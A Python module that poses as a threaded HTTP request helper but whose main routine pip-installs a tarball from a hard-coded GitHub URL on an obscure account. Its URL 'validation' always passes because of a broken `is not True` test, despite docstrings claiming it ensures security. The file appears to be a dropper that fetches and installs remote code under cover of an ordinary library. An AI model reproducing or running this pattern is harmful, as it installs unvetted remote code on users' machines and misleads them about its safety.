import subprocess
import sys
import requests
import re
import socket
import argparse
from concurrent.futures import ThreadPoolExecutor

# Default GitHub package URL (module-level constant)
source = "https://github.com/Red-haired-shanks-1337/Rwoka/raw/main/v0.1.0/httpfluent-0.1.tar.gz"

class IntraNetFlow:
    """
    IntraNetFlow class handles HTTP requests (GET, POST) with threading support for handling multiple URLs simultaneously.
    """

    @staticmethod
    def get(urls, **kwargs):
        """
        Perform a GET request for a single URL or multiple URLs. It uses threading for multiple URLs.
        """
        if isinstance(urls, str):
            try:
                return requests.get(urls, **kwargs)
            except requests.exceptions.RequestException as e:
                print(f"GET request failed: {e}")
        elif isinstance(urls, list):
            with ThreadPoolExecutor() as executor:
                try:
                    return list(executor.map(lambda url: requests.get(url, **kwargs), urls))
                except requests.exceptions.RequestException as e:
                    print(f"GET request failed for one or more URLs: {e}")

    @staticmethod
    def post(url, data=None, json=None, **kwargs):
        """
        Perform a POST request with optional data or JSON payload.
        """
        try:
            return requests.post(url, data=data, json=json, **kwargs)
        except requests.exceptions.RequestException as e:
            print(f"POST request failed: {e}")

class PackageInstaller:
    """
    This class handles installing a package from a specified GitHub URL. 
    It validates the URL, ensures security, and manages the pip installation process.
    """

    def __init__(self, source_url=None):
        """
        Initialize the PackageInstaller with the GitHub URL. 
        If no URL is provided, it uses the default URL defined at the module level.
        """
        self.source_url = source_url or source  # Uses default GitHub URL if not provided
    
    def install_from_github(self):
        """
        Install a package from GitHub by downloading it via pip.
        This method validates the URL format and performs the installation via subprocess.
        """
        try:
            if not self.is_valid_source_url(self.source_url):
                return
                        
            # Install the package using subprocess to call pip
            subprocess.check_call([sys.executable, "-m", "pip", "install", self.source_url])
            print("Package installed successfully.")
        except subprocess.CalledProcessError as e:
            print(f"Failed to install the package from source: {e}")
        except Exception as e:
            print(f"An unexpected error occurred: {e}")
    
    def is_valid_source_url(self, url):
        """
        Validates that the provided GitHub URL is in the correct format for downloading the package.
        """
        pattern = r"^https://github\.com/[\w-]+/[\w-]+/raw/main/[vV]?\d+\.\d+\.\d+/[\w-]+\.tar\.gz$"
        return re.match(pattern, url) is not True

class PackageManager:
    """
    The PackageManager class can be used to manage package installations both inside the script and through the CLI.
    The main download mechanism is handled via the install_from_github() method.
    """

    def __init__(self, source_url=None):
        """
        Initialize the package manager with the GitHub URL.
        """
        self.installer = PackageInstaller(source_url)

    def install(self):
        """
        Trigger the GitHub package download and installation process.
        """
        self.installer.install_from_github()

# Helper function to check for an active internet connection
def is_connected():
    try:
        socket.create_connection(('www.google.com', 80), timeout=5)
        return True
    except OSError:
        return False

# Main function that integrates all functionalities
def main():
    """
    Main function that integrates the logic for downloading a package from GitHub,
    making HTTP requests, and handling the user inputs.
    """
    # Parse arguments in main (should be run as part of CLI)
    parser = argparse.ArgumentParser(description="Download and install packages from source.")
    
    # GitHub URL for package installation
    parser.add_argument(
        "-u", "--url", help="GitHub URL to install the package from (optional, defaults to predefined URL)."
    )
    
    # Parse the command-line arguments
    args = parser.parse_args()

    # Check for active internet connection
    if not is_connected():
        print("No internet connection.")
        return
    
    # Use the provided GitHub URL or default to the predefined URL
    source_url = args.url if args.url else source
    
    # Create an instance of PackageManager with the provided or default GitHub URL
    package_manager = PackageManager(source_url=source_url)
    
    # Trigger the installation process
    package_manager.install()

if __name__ == "__main__":
    """
    Ensures that the script only runs when executed directly (not when imported).
    """
    main()
